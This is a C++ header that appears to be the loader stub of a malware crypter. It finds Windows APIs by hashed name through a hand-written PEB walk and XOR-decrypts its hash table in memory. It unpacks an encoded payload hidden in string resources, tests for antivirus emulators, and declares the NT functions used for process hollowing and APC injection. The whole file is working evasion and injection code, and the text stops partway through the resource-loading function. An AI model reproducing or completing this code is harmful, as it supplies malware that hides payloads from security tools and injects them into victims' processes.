#ifndef PELDR_H
#define PELDR_H

#pragma once
#include <Windows.h>
// #include <winternl.h>

// FUCK CRT 
void * __cdecl memset(void *pTarget, int value, size_t cbTarget) {
	unsigned char *p = static_cast<unsigned char *>(pTarget);
	while (cbTarget-- > 0) {
		*p++ = static_cast<unsigned char>(value);
	}
	return pTarget;
}

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)  

typedef __success(return >= 0) LONG NTSTATUS;

typedef enum _NT_PRODUCT_TYPE
{
	NtProductWinNt = 1,
	NtProductLanManNt = 2,
	NtProductServer = 3
} NT_PRODUCT_TYPE;

typedef enum _ALTERNATIVE_ARCHITECTURE_TYPE
{
	StandardDesign = 0,
	NEC98x86 = 1,
	EndAlternatives = 2
} ALTERNATIVE_ARCHITECTURE_TYPE;

typedef struct _KSYSTEM_TIME
{
	ULONG LowPart;
	LONG High1Time;
	LONG High2Time;
} KSYSTEM_TIME, *PKSYSTEM_TIME;

typedef struct _KUSER_SHARED_DATA
{
	ULONG TickCountLowDeprecated;
	ULONG TickCountMultiplier;
	KSYSTEM_TIME InterruptTime;
	KSYSTEM_TIME SystemTime;
	KSYSTEM_TIME TimeZoneBias;
	WORD ImageNumberLow;
	WORD ImageNumberHigh;
	WCHAR NtSystemRoot[260];
	ULONG MaxStackTraceDepth;
	ULONG CryptoExponent;
	ULONG TimeZoneId;
	ULONG LargePageMinimum;
	ULONG Reserved2[7];
	NT_PRODUCT_TYPE NtProductType;
	UCHAR ProductTypeIsValid;
	ULONG NtMajorVersion;
	ULONG NtMinorVersion;
	UCHAR ProcessorFeatures[64];
	ULONG Reserved1;
	ULONG Reserved3;
	ULONG TimeSlip;
	ALTERNATIVE_ARCHITECTURE_TYPE AlternativeArchitecture;
	LARGE_INTEGER SystemExpirationDate;
	ULONG SuiteMask;
	UCHAR KdDebuggerEnabled;
	UCHAR NXSupportPolicy;
	ULONG ActiveConsoleId;
	ULONG DismountCount;
	ULONG ComPlusPackage;
	ULONG LastSystemRITEventTickCount;
	ULONG NumberOfPhysicalPages;
	UCHAR SafeBootMode;
	ULONG SharedDataFlags;
	ULONG DbgErrorPortPresent : 1;
	ULONG DbgElevationEnabled : 1;
	ULONG DbgVirtEnabled : 1;
	ULONG DbgInstallerDetectEnabled : 1;
	ULONG SystemDllRelocated : 1;
	ULONG SpareBits : 27;
	UINT64 TestRetInstruction;
	ULONG SystemCall;
	ULONG SystemCallReturn;
	UINT64 SystemCallPad[3];
	union
	{
		KSYSTEM_TIME TickCount;
		UINT64 TickCountQuad;
	};
	ULONG Cookie;
	INT64 ConsoleSessionForegroundProcessId;
	ULONG Wow64SharedInformation[16];
	WORD UserModeGlobalLogger[8];
	ULONG HeapTracingPid[2];
	ULONG CritSecTracingPid[2];
	ULONG ImageFileExecutionOptions;
	union
	{
		UINT64 AffinityPad;
		ULONG ActiveProcessorAffinity;
	};
	UINT64 InterruptTimeBias;
} KUSER_SHARED_DATA, *PKUSER_SHARED_DATA;

typedef struct _LSA_UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	USHORT                  Flags;
	USHORT                  Length;
	ULONG                   TimeStamp;
	UNICODE_STRING          DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	ULONG                   MaximumLength;
	ULONG                   Length;
	ULONG                   Flags;
	ULONG                   DebugFlags;
	PVOID                   ConsoleHandle;
	ULONG                   ConsoleFlags;
	HANDLE                  StdInputHandle;
	HANDLE                  StdOutputHandle;
	HANDLE                  StdErrorHandle;
	UNICODE_STRING          CurrentDirectoryPath;
	HANDLE                  CurrentDirectoryHandle;
	UNICODE_STRING          DllPath;
	UNICODE_STRING          ImagePathName;
	UNICODE_STRING          CommandLine;
	PVOID                   Environment;
	ULONG                   StartingPositionLeft;
	ULONG                   StartingPositionTop;
	ULONG                   Width;
	ULONG                   Height;
	ULONG                   CharWidth;
	ULONG                   CharHeight;
	ULONG                   ConsoleTextAttributes;
	ULONG                   WindowFlags;
	ULONG                   ShowWindowFlags;
	UNICODE_STRING          WindowTitle;
	UNICODE_STRING          DesktopName;
	UNICODE_STRING          ShellInfo;
	UNICODE_STRING          RuntimeData;
	RTL_DRIVE_LETTER_CURDIR DLCurrentDirectory[0x20];
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB_LDR_DATA
{
	ULONG                   Length;
	BOOLEAN                 Initialized;
	PVOID                   SsHandle;
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;

} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct tagRTL_BITMAP
{
	ULONG  SizeOfBitMap; /* Number of bits in the bitmap */
	PULONG Buffer; /* Bitmap data, assumed sized to a DWORD boundary */
} RTL_BITMAP, *PRTL_BITMAP;

typedef struct _PEB
{
	BOOLEAN                      InheritedAddressSpace;             /*  00 */
	BOOLEAN                      ReadImageFileExecOptions;          /*  01 */
	BOOLEAN                      BeingDebugged;                     /*  02 */
	BOOLEAN                      SpareBool;                         /*  03 */
	HANDLE                       Mutant;                            /*  04 */
	HMODULE                      ImageBaseAddress;                  /*  08 */
	PPEB_LDR_DATA                LdrData;                           /*  0c */
	RTL_USER_PROCESS_PARAMETERS *ProcessParameters;                 /*  10 */
	PVOID                        SubSystemData;                     /*  14 */
	HANDLE                       ProcessHeap;                       /*  18 */
	PRTL_CRITICAL_SECTION        FastPebLock;                       /*  1c */
	PVOID /*PPEBLOCKROUTINE*/    FastPebLockRoutine;                /*  20 */
	PVOID /*PPEBLOCKROUTINE*/    FastPebUnlockRoutine;              /*  24 */
	ULONG                        EnvironmentUpdateCount;            /*  28 */
	PVOID                        KernelCallbackTable;               /*  2c */
	PVOID                        EventLogSection;                   /*  30 */
	PVOID                        EventLog;                          /*  34 */
	PVOID /*PPEB_FREE_BLOCK*/    FreeList;                          /*  38 */
	ULONG                        TlsExpansionCounter;               /*  3c */
	PRTL_BITMAP                  TlsBitmap;                         /*  40 */
	ULONG                        TlsBitmapBits[2];                  /*  44 */
	PVOID                        ReadOnlySharedMemoryBase;          /*  4c */
	PVOID                        ReadOnlySharedMemoryHeap;          /*  50 */
	PVOID                       *ReadOnlyStaticServerData;          /*  54 */
	PVOID                        AnsiCodePageData;                  /*  58 */
	PVOID                        OemCodePageData;                   /*  5c */
	PVOID                        UnicodeCaseTableData;              /*  60 */
	ULONG                        NumberOfProcessors;                /*  64 */
	ULONG                        NtGlobalFlag;                      /*  68 */
	BYTE                         Spare2[4];                         /*  6c */
	LARGE_INTEGER                CriticalSectionTimeout;            /*  70 */
	ULONG                        HeapSegmentReserve;                /*  78 */
	ULONG                        HeapSegmentCommit;                 /*  7c */
	ULONG                        HeapDeCommitTotalFreeThreshold;    /*  80 */
	ULONG                        HeapDeCommitFreeBlockThreshold;    /*  84 */
	ULONG                        NumberOfHeaps;                     /*  88 */
	ULONG                        MaximumNumberOfHeaps;              /*  8c */
	PVOID                       *ProcessHeaps;                      /*  90 */
	PVOID                        GdiSharedHandleTable;              /*  94 */
	PVOID                        ProcessStarterHelper;              /*  98 */
	PVOID                        GdiDCAttributeList;                /*  9c */
	PVOID                        LoaderLock;                        /*  a0 */
	ULONG                        OSMajorVersion;                    /*  a4 */
	ULONG                        OSMinorVersion;                    /*  a8 */
	ULONG                        OSBuildNumber;                     /*  ac */
	ULONG                        OSPlatformId;                      /*  b0 */
	ULONG                        ImageSubSystem;                    /*  b4 */
	ULONG                        ImageSubSystemMajorVersion;        /*  b8 */
	ULONG                        ImageSubSystemMinorVersion;        /*  bc */
	ULONG                        ImageProcessAffinityMask;          /*  c0 */
	ULONG                        GdiHandleBuffer[34];               /*  c4 */
	ULONG                        PostProcessInitRoutine;            /* 14c */
	PRTL_BITMAP                  TlsExpansionBitmap;                /* 150 */
	ULONG                        TlsExpansionBitmapBits[32];        /* 154 */
	ULONG                        SessionId;                         /* 1d4 */
} PEB, *PPEB;

#define DEBUG_BREAK __asm { int 3 }

#define KEY_SIZE	256

// ****************************************
// ***** DYNAMIC DATA *********************
// ****************************************

#pragma data_seg(".data")
volatile char lpKey[KEY_SIZE] = {
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72,
	0x4e, 0xa7, 0xc9, 0xee, 0xcb, 0x43, 0x6c, 0x53, 0xf6, 0x2a, 0xce, 0x37, 0x1e, 0x68, 0xc2, 0x72
};

struct Settings
{
	BOOL bCompress;
};

// Settings
#pragma data_seg(".data")
volatile BYTE lpSettings[4] = { 0x00, 0x00, 0x00, 0x00 // [•] Compressed
};

#pragma data_seg(".data")
// Begin API Hashes
volatile DWORD maskOffsetBegin = 0xDEADDEAD;

volatile DWORD hash_FindResourceW = 0x5681127;
volatile DWORD hash_SizeofResource = 0xDAA96B5;
volatile DWORD hash_LoadResource = 0x9B3B115;
volatile DWORD hash_LockResource = 0x9B36815;
volatile DWORD hash_VirtualAlloc = 0x3D8CAE3;
volatile DWORD hash_CreateProcessW = 0x1E16457;
volatile DWORD hash_NtAllocateVirtualMemory = 0x13F9F79;
volatile DWORD hash_NtFreeVirtualMemory = 0xBC01609;
volatile DWORD hash_NtWriteVirtualMemory = 0x7DC9209;
volatile DWORD hash_NtReadVirtualMemory = 0xBAB4A59;
volatile DWORD hash_NtQueryVirtualMemory = 0x7BA5149;
volatile DWORD hash_NtProtectVirtualMemory = 0x75E7E39;
volatile DWORD hash_NtGetContextThread = 0x4B2FB04;
volatile DWORD hash_NtSetContextThread = 0x4B3BB04;
volatile DWORD hash_NtQueueApcThread = 0x3614A94;
volatile DWORD hash_NtAlertResumeThread = 0x6AB0384;
volatile DWORD hash_NtUnmapViewOfSection = 0xC8338EE;
volatile DWORD hash_iswalpha = 0xAD831E1;
volatile DWORD hash_ExitProcess = 0x7D96C33;
volatile DWORD hash_GetTickCount = 0xD26F2A4;
volatile DWORD hash_NtDelayExecution = 0x7812C1E;
volatile DWORD hash_NtRegisterThreadTerminatePort = 0x6DAEB84;
volatile DWORD hash_RtlGetCompressionWorkSpaceSize = 0xA455B15;
volatile DWORD hash_RtlDecompressBuffer = 0xA6CEBB2;
volatile DWORD hash_NtResumeThread = 0x3232414;

// End API Hashes
volatile DWORD maskOffsetEnd = 0xDEADC0DE;

#pragma data_seg()

// ****************************************
// ***** API DEFINITIONS ******************
// ****************************************

enum MODULE_BASE
{
	NTDLL = 0,
	KERNEL32 = 1
};

struct API_DEFINES
{
	typedef HRSRC(WINAPI* t_FindResourceW)(
		_In_opt_ HMODULE hModule,
		_In_     WCHAR* lpName,
		_In_     WCHAR* lpType);

	typedef DWORD(WINAPI* t_SizeofResource)(
		_In_opt_ HMODULE hModule,
		_In_     HRSRC   hResInfo
		);

	typedef HGLOBAL(WINAPI* t_LoadResource)(
		_In_opt_ HMODULE hModule,
		_In_     HRSRC   hResInfo
		);

	typedef LPVOID(WINAPI* t_LockResource)(
		_In_ HGLOBAL hResData
		);

	typedef LPVOID(WINAPI* t_VirtualAlloc)(
		_In_opt_ LPVOID lpAddress,
		_In_     SIZE_T dwSize,
		_In_     DWORD  flAllocationType,
		_In_     DWORD  flProtect
		);

	typedef BOOL(WINAPI* t_CreateProcessW)(
		_In_opt_    WCHAR*                lpApplicationName,
		_Inout_opt_ WCHAR*                lpCommandLine,
		_In_opt_    LPSECURITY_ATTRIBUTES lpProcessAttributes,
		_In_opt_    LPSECURITY_ATTRIBUTES lpThreadAttributes,
		_In_        BOOL                  bInheritHandles,
		_In_        DWORD                 dwCreationFlags,
		_In_opt_    LPVOID                lpEnvironment,
		_In_opt_    LPCTSTR               lpCurrentDirectory,
		_In_        LPSTARTUPINFOW        lpStartupInfo,
		_Out_       LPPROCESS_INFORMATION lpProcessInformation
		);

	typedef NTSTATUS(NTAPI* t_NtAllocateVirtualMemory)(
		IN HANDLE               ProcessHandle,
		IN OUT PVOID            *BaseAddress,
		IN ULONG                ZeroBits,
		IN OUT PULONG           RegionSize,
		IN ULONG                AllocationType,
		IN ULONG                Protect);

	typedef NTSTATUS(NTAPI* t_NtFreeVirtualMemory)(
		IN HANDLE               ProcessHandle,
		IN PVOID                *BaseAddress,
		IN OUT PULONG           RegionSize,
		IN ULONG                FreeType);

	typedef NTSTATUS(NTAPI* t_NtWriteVirtualMemory)(
		IN HANDLE               ProcessHandle,
		IN PVOID                BaseAddress,
		IN PVOID                Buffer,
		IN ULONG                NumberOfBytesToWrite,
		OUT PULONG              NumberOfBytesWritten OPTIONAL);

	typedef NTSTATUS(NTAPI* t_NtReadVirtualMemory)(
		IN HANDLE               ProcessHandle,
		IN PVOID                BaseAddress,
		OUT PVOID               Buffer,
		IN ULONG                NumberOfBytesToRead,
		OUT PULONG              NumberOfBytesReaded OPTIONAL);

	typedef enum _MEMORY_INFORMATION_CLASS
	{
		MemoryBasicInformation
	} MEMORY_INFORMATION_CLASS, *PMEMORY_INFORMATION_CLASS;

	typedef NTSTATUS(NTAPI* t_NtQueryVirtualMemory)(
		IN HANDLE               ProcessHandle,
		IN PVOID                BaseAddress,
		IN MEMORY_INFORMATION_CLASS MemoryInformationClass,
		OUT PVOID               Buffer,
		IN ULONG                Length,
		OUT PULONG              ResultLength OPTIONAL);

	typedef NTSTATUS(NTAPI* t_NtProtectVirtualMemory)(
		IN HANDLE               ProcessHandle,
		IN OUT PVOID            *BaseAddress,
		IN OUT PULONG           NumberOfBytesToProtect,
		IN ULONG                NewAccessProtection,
		OUT PULONG              OldAccessProtection);

	typedef NTSTATUS(NTAPI* t_NtGetContextThread)(
		IN HANDLE               ThreadHandle,
		OUT PCONTEXT            pContext);

	typedef NTSTATUS(NTAPI* t_NtSetContextThread)(
		IN HANDLE               ThreadHandle,
		IN PCONTEXT             Context);

	typedef struct _IO_STATUS_BLOCK
	{
		union
		{
			NTSTATUS Status;
			PVOID Pointer;
		} DUMMYUNIONNAME;

		ULONG_PTR Information;
	} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

	typedef
		VOID
		(NTAPI *PIO_APC_ROUTINE) (
		IN PVOID ApcContext,
		IN PIO_STATUS_BLOCK IoStatusBlock,
		IN ULONG Reserved
		);

	typedef NTSTATUS(NTAPI* t_NtQueueApcThread)(
		IN HANDLE               ThreadHandle,
		IN PIO_APC_ROUTINE      ApcRoutine,
		IN PVOID                ApcRoutineContext OPTIONAL,
		IN PIO_STATUS_BLOCK     ApcStatusBlock OPTIONAL,
		IN ULONG                ApcReserved OPTIONAL);

	typedef NTSTATUS(NTAPI* t_NtAlertResumeThread)(
		IN HANDLE               ThreadHandle,
		OUT PULONG              SuspendCount);

	typedef NTSTATUS(NTAPI* t_NtUnmapViewOfSection)(
		_In_     HANDLE ProcessHandle,
		_In_opt_ PVOID  BaseAddress
		);

	typedef VOID(WINAPI* t_ExitProcess)(
		_In_ UINT dwExitCode
		);

	typedef NTSTATUS(NTAPI* t_NtDelayExecution)(
		IN BOOLEAN              Alertable,
		IN PLARGE_INTEGER       DelayInterval
		);

	typedef NTSTATUS(NTAPI* t_RtlGetCompressionWorkSpaceSize)(
		IN ULONG                CompressionFormat,
		OUT PULONG              pNeededBufferSize,
		OUT PULONG              pUnknown);

	typedef NTSTATUS(NTAPI* t_RtlDecompressBuffer)(
		IN ULONG                CompressionFormat,
		OUT PVOID               DestinationBuffer,
		IN ULONG                DestinationBufferLength,
		IN PVOID                SourceBuffer,
		IN ULONG                SourceBufferLength,
		OUT PULONG              pDestinationSize);

	typedef NTSTATUS(NTAPI*
		t_NtResumeThread)(
		IN HANDLE               ThreadHandle,
		OUT PULONG              SuspendCount OPTIONAL);

};

API_DEFINES::t_FindResourceW x_FindResourceW;
API_DEFINES::t_SizeofResource x_SizeofResource;
API_DEFINES::t_LoadResource x_LoadResource;
API_DEFINES::t_LockResource x_LockResource;
API_DEFINES::t_VirtualAlloc x_VirtualAlloc;

API_DEFINES::t_CreateProcessW x_CreateProcessW;
API_DEFINES::t_NtAllocateVirtualMemory x_NtAllocateVirtualMemory;
API_DEFINES::t_NtFreeVirtualMemory x_NtFreeVirtualMemory;
API_DEFINES::t_NtWriteVirtualMemory x_NtWriteVirtualMemory;
API_DEFINES::t_NtReadVirtualMemory x_NtReadVirtualMemory;
API_DEFINES::t_NtQueryVirtualMemory x_NtQueryVirtualMemory;
API_DEFINES::t_NtProtectVirtualMemory x_NtProtectVirtualMemory;
API_DEFINES::t_NtGetContextThread x_NtGetContextThread;
API_DEFINES::t_NtSetContextThread x_NtSetContextThread;
API_DEFINES::t_NtQueueApcThread x_NtQueueApcThread;
API_DEFINES::t_NtAlertResumeThread x_NtAlertResumeThread;
API_DEFINES::t_NtUnmapViewOfSection x_NtUnmapViewOfSection;
API_DEFINES::t_NtDelayExecution x_NtDelayExecution;
API_DEFINES::t_RtlGetCompressionWorkSpaceSize x_RtlGetCompressionWorkSpaceSize;
API_DEFINES::t_RtlDecompressBuffer x_RtlDecompressBuffer;
API_DEFINES::t_NtResumeThread x_NtResumeThread;

LPVOID KERNEL32_BASE_ADDRESS;
LPVOID NTDLL_BASE_ADDRESS;

Settings* pSettings;

bool load_kernel32() {

	LPVOID lpKernel32 = NULL;
	LPVOID pPEB = (LPVOID)__readfsdword(0x30);
	__asm {
		mov eax, pPEB
			mov eax, [eax + 0x0c]
			mov eax, [eax + 0x14]
			mov eax, [eax]
			mov eax, [eax]
			mov eax, [eax + 0x10]
			mov lpKernel32, eax
	}
	KERNEL32_BASE_ADDRESS = lpKernel32;
	return lpKernel32 != NULL;
}

bool load_ntdll() {

	LPVOID lpNtdll = NULL;
	LPVOID pPEB = (LPVOID)__readfsdword(0x30);
	__asm {
		mov eax, pPEB
			mov eax, [eax + 0x0c]
			mov eax, [eax + 0x14]
			mov eax, [eax]
			mov eax, [eax + 0x10]
			mov lpNtdll, eax
	}
	NTDLL_BASE_ADDRESS = lpNtdll;
	return lpNtdll != NULL;
}


unsigned int ELFHash(char* str, unsigned int len) {
	unsigned int hash = 0;
	unsigned int x = 0;
	unsigned int i = 0;

	for (i = 0; i < len; str++, i++) {
		hash = (hash << 4) + (*str);
		if ((x = hash & 0xF0000000L) != 0) {
			hash ^= (x >> 24);
		}
		hash &= ~x;
	}

	return hash;
}

void* m_memcpy(void *szBuf, const void *szStr, int nLen) {
	if (szBuf && szStr) {
		volatile char *Buf = (volatile char *)szBuf;
		volatile char *Str = (volatile char *)szStr;
		while (nLen) {
			nLen--;
			*Buf = *Str;
			Buf++;
			Str++;
		}
	}
	return szBuf;
}

size_t m_strlen(const TCHAR* str) {
	const TCHAR * start = str;
	while (*str) ++str;
	return str - start;
}

int m_strcmp(const TCHAR * str1,
			 const TCHAR * str2) {
	while (*str1 && *str1 == *str2) {
		++str1;
		++str2;
	}
	return *str1 - *str2;
}

VOID init_settings() {

	PPEB pPEB = (PPEB)__readfsdword(0x30);
	LPVOID currentImageBase = pPEB->ImageBaseAddress;

	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)currentImageBase;
	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)((DWORD)currentImageBase + pIDH->e_lfanew);
	PIMAGE_SECTION_HEADER pDataSect = (PIMAGE_SECTION_HEADER)((DWORD)currentImageBase + pIDH->e_lfanew + 0xF8 + (2 * 0x28));

	pSettings = (Settings*)((DWORD)currentImageBase + pDataSect->VirtualAddress + KEY_SIZE);
}

VOID decrypt_hashes() {

	PPEB pPEB = (PPEB)__readfsdword(0x30);
	LPVOID currentImageBase = pPEB->ImageBaseAddress;

	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)currentImageBase;
	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)((DWORD)currentImageBase + pIDH->e_lfanew);
	PIMAGE_SECTION_HEADER pDataSect = (PIMAGE_SECTION_HEADER)((DWORD)currentImageBase + pIDH->e_lfanew + 0xF8 + (2 * 0x28));

	// Decrypt hashes in memory
	DWORD* addrHashes = (DWORD*)((DWORD)currentImageBase + pDataSect->VirtualAddress + KEY_SIZE + sizeof(Settings));

	DWORD HashKey = *addrHashes;
	addrHashes = (DWORD*)addrHashes++;

	while ((DWORD)*addrHashes != 0xDEADC0DE) {
		(*addrHashes++) ^= HashKey;
	}
}

LPVOID load_func(MODULE_BASE modBase, DWORD dwFuncHash) {

	LPVOID lpModuleBase = NULL;

	switch (modBase) {
		case NTDLL:
			lpModuleBase = NTDLL_BASE_ADDRESS;
			break;
		case KERNEL32:
			lpModuleBase = KERNEL32_BASE_ADDRESS;
			break;
	}

	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)lpModuleBase;
	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)((DWORD)lpModuleBase + pIDH->e_lfanew);

	PIMAGE_EXPORT_DIRECTORY pIED = (PIMAGE_EXPORT_DIRECTORY)((DWORD)lpModuleBase + pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	LPVOID* addrFunctions = (LPVOID*)((DWORD)lpModuleBase + pIED->AddressOfFunctions);
	char** addrNames = (char**)((DWORD)lpModuleBase + pIED->AddressOfNames);
	WORD* addrNameOrdinals = (WORD*)((DWORD)lpModuleBase + pIED->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pIED->NumberOfNames; i++) {

		char* pszFunctionName = (char*)((DWORD)lpModuleBase + (DWORD)addrNames[i]);
		DWORD elfHash = ELFHash(pszFunctionName, m_strlen(pszFunctionName));

		if (elfHash == dwFuncHash) {
			return (LPVOID)((DWORD)lpModuleBase + (DWORD)addrFunctions[addrNameOrdinals[i]]);
		}
	}

	return NULL;
}

LPBYTE base64Decode(LPSTR source, SIZE_T sourceSize, SIZE_T *destSize) {

	char cd64[] = "|$$$}rstuvwxyz{$$$$$$$>?@ABCDEFGHIJKLMNOPQRSTUVW$$$$$$XYZ[\\]^_`abcdefghijklmnopq";
	DWORD dwMemSize = sourceSize + sizeof(BYTE);
	LPBYTE dest = (LPBYTE)x_VirtualAlloc(NULL, sourceSize + sizeof(BYTE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (dest != NULL) {
		LPBYTE p = (LPBYTE)source;
		LPBYTE e = p + sourceSize;
		LPBYTE r = (LPBYTE)dest;

		BYTE in[4], out[3], v;
		int len, i;

		while (p < e) {
			for (len = 0, i = 0; i < 4 && p < e; i++) {
				v = 0;
				while (p < e && v == 0) {
					v = (BYTE)*(p++);
					v = (BYTE)((v < 43 || v > 122) ? 0 : cd64[v - 43]);
					if (v != 0)v = (BYTE)((v == '$') ? 0 : v - 61);
				}

				if (v != 0) {
					len++;
					in[i] = (BYTE)(v - 1);
				}
			}

			if (len) {
				out[0] = (BYTE)(in[0] << 2 | in[1] >> 4);
				out[1] = (BYTE)(in[1] << 4 | in[2] >> 2);
				out[2] = (BYTE)(((in[2] << 6) & 0xC0) | in[3]);
				for (i = 0; i < len - 1; i++) { *(r++) = out[i]; if (i == 0)i = 0; }
			}
		}
		*r = 0;
		if (destSize)*destSize = (SIZE_T)(r - dest);
	}

	return dest;
}

void xor_encrypt_decrypt(char* lpData, DWORD dwLen) {
	for (DWORD i = 0; i < dwLen; i++) {
		lpData[i] ^= lpKey[i % KEY_SIZE];
	}
}

void* DecompressData(void* lpCompressedBuffer, DWORD dwCompressedSize, DWORD* dwUnCompressedSize) {

	void* lpDecompressed = x_VirtualAlloc(NULL, dwCompressedSize * 10, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	//x_RtlGetCompressionWorkSpaceSize = reinterpret_cast<API_DEFINES::t_RtlGetCompressionWorkSpaceSize>(load_func(MODULE_BASE::NTDLL, hash_RtlGetCompressionWorkSpaceSize));
	x_RtlDecompressBuffer = reinterpret_cast<API_DEFINES::t_RtlDecompressBuffer>(load_func(MODULE_BASE::NTDLL, hash_RtlDecompressBuffer));

	// x_RtlDecompressBuffer(0x02 | 0x0100, lpCompressedBuffer, dwSize, lpCompressedBuffer, dwSize, &(*dwUnCompressedSize));
	x_RtlDecompressBuffer(0x02, lpDecompressed, dwCompressedSize * 10, lpCompressedBuffer, dwCompressedSize, &(*dwUnCompressedSize));
	return lpDecompressed;
}

#define MM_SHARED_USER_DATA_VA 0x7FFE0000

ULONG InternalGetTickCount() {

	PKUSER_SHARED_DATA SharedUserData = (PKUSER_SHARED_DATA)MM_SHARED_USER_DATA_VA;

	ULARGE_INTEGER TickCount;

	while (TRUE) {
		TickCount.HighPart = (ULONG)SharedUserData->TickCount.High1Time;
		TickCount.LowPart = SharedUserData->TickCount.LowPart;

		if (TickCount.HighPart == (ULONG)SharedUserData->TickCount.High2Time)
			break;

		YieldProcessor();
	}

	ULONG tick1 = ((unsigned __int64)(unsigned int)(TickCount.LowPart)*(unsigned __int64)(unsigned int)(SharedUserData->TickCountMultiplier) >> 24);
	ULONG tick2 = ((unsigned __int64)(unsigned int)((TickCount.HighPart << 8) & 0xFFFFFFFF)*(unsigned __int64)(unsigned int)(SharedUserData->TickCountMultiplier));

	return tick1 + tick2;
}

ULONG InternalGetTickCount_WINAPI() {

	ULONG dwTickCount = 0;

	LPVOID lpGetTickCount = load_func(MODULE_BASE::KERNEL32, hash_GetTickCount);

	__asm{
		mov eax, lpGetTickCount
			call eax
			mov dwTickCount, eax
	}

	return dwTickCount;
}

bool checkEmulator_GetTickCount() {

	ULONG dwOrig1 = InternalGetTickCount();
	ULONG dwOrig2 = InternalGetTickCount_WINAPI();

	if (dwOrig1 != dwOrig2) {
		return true;
	}

	for (size_t i = 0; i < 10000; i++) {
		__asm{ pushad }
		//		emul_func_loop();
		__asm { popad }
	}

	ULONG dwNext1 = InternalGetTickCount();
	ULONG dwNext2 = InternalGetTickCount_WINAPI();

	if (dwNext1 != dwNext2) {
		return true;
	}

	if (dwNext1 - dwOrig1 > 2000)
		return true;

	if (dwNext2 - dwOrig2 > 2000)
		return true;

	return false;
}


bool loader_init() {
	return (load_kernel32() && load_ntdll());
}

LPVOID loader_load_res(DWORD* dwFileLenOut) {

	DWORD x = 1;
	DWORD dwChunkSize = 0;

	LPVOID lpReturnBuffer = NULL;

	x_FindResourceW = reinterpret_cast<API_DEFINES::t_FindResourceW>(load_func(MODULE_BASE::KERNEL32, hash_FindResourceW));
	while (HRSRC hResource = x_FindResourceW(NULL, (wchar_t*)x, (wchar_t*)RT_STRING)) {

		if (x == 1) {
			x_SizeofResource = reinterpret_cast<API_DEFINES::t_SizeofResource>(load_func(MODULE_BASE::KERNEL32, hash_SizeofResource));
			dwChunkSize = x_SizeofResource(NULL, hResource);
		}

		x++;
	}

	x_VirtualAlloc = reinterpret_cast<API_DEFINES::t_VirtualAlloc>(load_func(MODULE_BASE::KERNEL32, hash_VirtualAlloc));
